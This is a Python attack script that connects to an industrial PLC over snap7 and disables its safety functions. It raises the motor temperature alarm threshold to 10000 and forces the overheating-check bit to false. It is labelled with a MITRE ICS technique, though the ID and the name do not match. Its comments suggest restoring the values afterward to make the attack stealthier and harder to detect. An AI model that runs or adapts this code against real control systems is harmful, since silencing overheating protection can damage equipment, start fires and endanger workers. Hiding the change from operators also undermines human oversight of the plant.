import snap7
import struct
import time

# Define PLC connection parameters (Replace with actual IP address if needed)
PLC_IP = '192.168.0.10'  #  Replace with the actual IP address of your PLC
PLC_RACK = 0
PLC_SLOT = 1

# Define tag addresses and data types
MOTOR_TEMP_ADDRESS = 7  # MW7
MASTER_FAN_B_HMI_ADDRESS = 0.5  # M0.5 (Bit address, so we need to handle it differently)
OVERHEATING_CHECK_ADDRESS = 0.2 # M0.2
# Function to read a boolean value from PLC memory
def read_bool(plc, db_number, start_byte, bit_offset):
    """Reads a boolean value from the PLC memory."""
    byte_data = plc.read_area(snap7.const.Areas.MK, 0, start_byte, 1)
    byte_value = byte_data[0]
    mask = 1 << bit_offset
    return (byte_value & mask) != 0

# Function to write a boolean value to PLC memory
def write_bool(plc, db_number, start_byte, bit_offset, value):
    """Writes a boolean value to the PLC memory."""
    byte_data = plc.read_area(snap7.const.Areas.MK, 0, start_byte, 1)
    byte_value = byte_data[0]
    mask = 1 << bit_offset
    if value:
        byte_value |= mask  # Set the bit
    else:
        byte_value &= ~mask  # Clear the bit
    plc.write_area(snap7.const.Areas.MK, 0, start_byte, bytes([byte_value]))

# Function to read an integer value from PLC memory
def read_int(plc, db_number, address):
    """Reads an integer value from the PLC memory."""
    byte_data = plc.read_area(snap7.const.Areas.MK, 0, address, 2)  # Integers are 2 bytes
    return struct.unpack(">h", byte_data)[0]  # ">h" for big-endian short (16-bit)

# Function to write an integer value to PLC memory
def write_int(plc, db_number, address, value):
    """Writes an integer value to the PLC memory."""
    data = struct.pack(">h", value)  # ">h" for big-endian short (16-bit)
    plc.write_area(snap7.const.Areas.MK, 0, address, data)



def main():
    try:
        # 1. Connect to the PLC
        plc = snap7.client.Client()
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        #  MITRE Technique: T0407 - Inhibit Response Function, Modify Alarm Settings
        #  Objective:  Prevent 'Master_Fan_B_HMI' from triggering, disable overheating check.

        #  Step 1: Modify the 'Motor_Temp' threshold to a very high value
        #  This will prevent 'Master_Fan_B_HMI' from being set based on temperature

        original_temp_threshold = read_int(plc, 0, MOTOR_TEMP_ADDRESS)
        print(f"Original Motor_Temp threshold: {original_temp_threshold}")

        # Set a ridiculously high temperature threshold to effectively disable the alarm.
        new_temp_threshold = 10000
        write_int(plc, 0, MOTOR_TEMP_ADDRESS, new_temp_threshold)
        print(f"Modified Motor_Temp threshold to: {new_temp_threshold}")

        # Step 2: Disable the Overheating Check
        # This is done by setting the 'Overheating_Check' tag to always FALSE.

        original_overheating_check_status = read_bool(plc,0,0,2)
        print(f"Original Overheating_Check status: {original_overheating_check_status}")

        write_bool(plc, 0, 0, 2, False) #M0.2 set to false
        print(f"Overheating_Check disabled by setting tag M0.2 to False")

        # Verification (Optional):  Read back the values to confirm the changes.

        modified_temp_threshold = read_int(plc, 0, MOTOR_TEMP_ADDRESS)
        print(f"Verified Motor_Temp threshold: {modified_temp_threshold}")

        modified_overheating_check_status = read_bool(plc, 0, 0, 2)
        print(f"Verified Overheating_Check status: {modified_overheating_check_status}")

        # Important: Consider adding code to restore the original values after a certain time.
        # This would make the attack more stealthy and harder to detect.

        #  Example of restoring original values (commented out for safety):
        # time.sleep(60)  # Wait for 60 seconds
        # write_int(plc, 0, MOTOR_TEMP_ADDRESS, original_temp_threshold)
        # write_bool(plc, 0, 0, 2, original_overheating_check_status) # Overheating_Check set to original value
        # print("Original values restored.")



    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")

if __name__ == "__main__":
    main()